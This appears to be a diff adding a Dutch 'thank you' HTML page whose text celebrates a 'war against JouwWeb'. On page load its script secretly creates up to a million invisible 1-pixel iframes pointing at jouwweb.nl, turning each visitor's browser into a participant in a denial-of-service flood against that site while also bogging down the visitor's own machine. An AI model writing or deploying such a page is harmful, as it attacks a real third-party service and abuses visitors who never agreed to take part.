@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bedankt!</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            background-color: #eaff7b;
+        }
+
+        .glowing-text {
+            font-size: 24px;
+            font-weight: bold;
+            color: #fff;
+            text-align: center;
+            text-transform: uppercase;
+            animation: glow 1.5s ease-in-out infinite alternate;
+        }
+
+        @keyframes glow {
+            0% {
+                text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00, 0 0 30px #00ff00, 0 0 40px #00ff00;
+            }
+            100% {
+                text-shadow: 0 0 20px #ff0000, 0 0 30px #ff0000, 0 0 40px #ff0000, 0 0 50px #ff0000;
+            }
+        }
+
+        iframe {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="glowing-text">Bedankt voor uw steun in de oorlog tegen JouwWeb</div>
+
+    <script>
+        function createIframeWithDelay(index) {
+            let iframe = document.createElement('iframe');
+            iframe.src = 'https://jouwweb.nl';
+            document.body.appendChild(iframe);
+        }
+
+        function createIframesWithDelay() {
+            let delay = 1; // Delay in milliseconds
+            for (let i = 0; i < 1000000; i++) {
+                setTimeout(() => {
+                    createIframeWithDelay(i);
+                }, i * delay);
+            }
+        }
+
+        // Start creating iframes with delay
+        createIframesWithDelay();
+    </script>
+</body>
+</html>
